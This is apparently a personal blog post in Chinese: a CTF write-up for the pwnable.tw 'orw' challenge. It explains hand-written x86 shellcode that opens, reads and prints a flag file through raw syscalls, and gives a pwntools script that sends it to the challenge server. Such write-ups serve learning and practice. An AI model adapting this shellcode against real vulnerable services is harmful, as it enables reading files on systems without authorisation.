---
title: CTF|pwnable.tw orw writeup
date: 2018-03-14 12:32:31
tags: pwn
categories: CTF
---
pwnable.tw orw writeup shellcode的编写
<!-- more -->
呀真的好久没有写博客了，最近在做一些题，都在看别人的题解，做过也忘了，接下来希望好好记录一下，帮助自己理解。

这道题是有关`shellcode`的编写，这部分我之前也没学习过，都是使用机器生成的。就...结合别人的writeup 说一下自己的理解吧。

高级语言形式
```c
char *fn = "/home/orw/flag";
sys_open(fn,0,0)
sys_read(3,fn,0x30)
sys_write(1,fn,0x30)
```
查看 [linux 系统调用](http://syscalls.kernelgrok.com/) 获得各个函数的调用号

```x86asm
首先是第一部分 sys_open
xor ecx,ecx ;清空ecx寄存器
mov eax,0x5;查看以上资料知道 sys_open 对应0x5
push ecx ;把一个空值压入栈中(这里不是很理解)
push 0x67616c66;galf(flag) 接下来就是把字符串作为参数压入栈中 数字就是字符的ASCII码十六进制值
push 0x2f77726f; /wro (orw/)
push 0x2f656d6f; /emo (ome/)
push 0x682f2f2f; h/// (///h)
mov ebx,esp;把内容移到ebx
xor edx,edx;清空 edx
int 0x80;中断 执行syscall

第二部分是sys_read
mov eax,0x3;sys_read
mov ecx,ebx;flag文件中的内容
mov ebx,0x3;文件描述符
mov dl,0x30;用于中断(??)
int 0x80;中断 执行syscall

第三部分是sys_write
mov eax,0x4;sys_write
mov bl,0x1;用于中断
int 0x80


```
最后的脚本：
```python
from pwn import *
io = remote('chall.pwnable.tw',10001)
shellcode = ''
shellcode+=asm('xor ecx,ecx;mov eax,0x5;push ecx;push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebx,esp;')
shellcode +=asm('xor edx,edx;int 0x80;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;')
shellcode+=asm('mov eax,0x4; mov bl,0x1;int 0x80;')
io.recvuntil(':')
io.send(shellcode)
io.interactive()
```
